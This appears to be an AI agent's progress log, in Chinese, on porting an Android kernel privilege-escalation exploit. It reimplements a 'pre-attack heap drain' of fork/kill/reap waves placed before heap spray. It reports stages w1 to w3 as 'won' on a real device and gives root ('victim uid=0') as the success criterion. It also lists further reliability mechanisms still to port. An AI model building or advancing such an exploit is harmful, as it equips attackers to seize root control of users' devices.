# 43499 · 新目标第 11 轮：`slab_drain` 已实现（机制侧第①件）✓✓

## 一、退役语义（✓，逐字 ✓）

```cpp
// primitives.cpp:30 —— "Pre-attack heap drain (fork/kill/reap waves)" ✓
void slab_drain(void) {
    /* Keep this light in untrusted_app. Aggressive fork storms trip LMK/OOM (exit 137)
     * especially right before heap spray. */
    waves = (boottime_sec > 60) ? 2 : 1;   batch = (同上) ? 64 : 32;
    for each wave: fork `batch` children that pause() ⇒ 随 RAII 一起 kill+reap ✓
}
// 调用位置（steps.cpp）: :86（每阶段**第一次尝试前** ✓）/ :240（attempt==1 ✓）/ :382·:417（W1·W2 阶段前 ✓）
```

## 二、本树实现（✓）

```
main.cpp 匿名命名空间：`[[maybe_unused]] void drain_slab_waves() noexcept` ✓
· 与退役同参数（waves 2/1 ✓、batch 64/32 ✓，判据取自 CLOCK_BOOTTIME ✓）；
· kill(SIGKILL) 后**逐个 waitpid**（EINTR 重试 ✓）⇒ 不留僵尸 ✓（第 8 轮的教训 ✓）；
· `#if defined(__ANDROID__)` 平台守卫 ✓（与退役"primitives.cpp 是 Android-only"同形 ✓）；
· 调用点：重试循环 `round == 1` 时 ✓（= 退役 `steps.cpp:86` 的位置 ✓）。
```

## 三、真机判据（✓✓）

```
`step result w1 => won` ✓ / `w2 => won` ✓ / `w3 => won` ✓（三点齐 ✓）；
`step retry w2 round=14 / 15` ✓ ⇒ **15 轮跑满** ✓；`victim fork failed errno=` **零出现** ✓（⇒ 无 EAGAIN ✓）；
但 `main: victim uid=2000` ✗ ⇒ **drain 是必要的结构 ✓，但不是充分条件** ✗。
```

## 四、门禁（✓）

```
check → RC=0，**108 PASS** ✓；android → RC=0，0 error / 0 warning ✓
```

## 五、下一步（机制侧余下三件 ✓）

| # | 待验 | 出处 |
| --- | --- | --- |
| ② | `discard_prebuilt_page()`：路由失败即丢弃预建页 ✓ | `retry_write_stage` ✓ |
| ③ | W2 的 `w2_fast_repair_prebuild`：**路由前**预建 ✓（我只有"修复轮"✗） | `multicast_waiter_route.cpp:170` ✓ |
| ④ | `in_direct_map` 首行守卫 ✓（具名拒绝而非硬写） | `steps.cpp:70` ✓ |

```
判据不变：任一轮 `main: victim uid=0` ✓。
```
